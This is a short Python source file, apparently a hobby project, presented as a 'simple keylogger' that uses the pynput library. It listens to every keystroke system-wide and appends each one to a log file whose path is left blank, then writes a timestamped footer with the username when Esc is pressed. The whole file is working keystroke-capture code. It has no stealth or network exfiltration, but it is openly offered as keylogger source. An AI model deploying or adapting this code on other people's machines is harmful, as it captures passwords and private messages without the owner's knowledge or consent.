"""
SIMPLE KEYLOGGER
A simple keylogger, uses pynput. 

Author - Sriram Adhithya Gopinathan
Email - sriramgopi.vkl123@gmail.com
"""
import pynput.keyboard as Keyboard
import os
import datetime

# makes the header look fancy
def prettify(self):
		usr = str(os.getenv('USER'))
		dt = str(datetime.datetime.now())
		head = '\n<' + dt + '@' + usr + ' LOCAL' + '>'
		body = self
		
		return head +''+body 


# Logs the text into given path
def log(self, text):
		
		if os.path.exists(self) is True:
			with open(self, 'a') as f:
				f.write(text)
				f.close()
		else:
			with open(self, 'x') as f:
				f.write(text)
				f.close()
	


def on_press(key):
	# Callback function whenever a key is pressed
	path = '' #This is where all your keystrokes will be saved.
	try:
		
		txt = str(key)
		txt = txt.replace("'","")
		log(path, txt)
		if key == Keyboard.Key.enter:
			txt = '\n'
			log(path, txt)
		if key == Keyboard.Key.space:
			txt = ' '
			log(path, txt)
	except AttributeError:

		if key == Keyboard.Key.space:
			txt = ' '
		
		log(path, txt)
	
		 		
def on_release(key):
	print(f'Key {key} released')
	path = '' #This is where all your keystrokes will be saved
	if key == Keyboard.Key.esc:
		# Stop the listener
		with open(path, 'a') as f:
				f.write(prettify('?EOF-!\n\n'))
				f.close()
		return False

	elif key == Keyboard.Key.space:
			txt = ''


with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()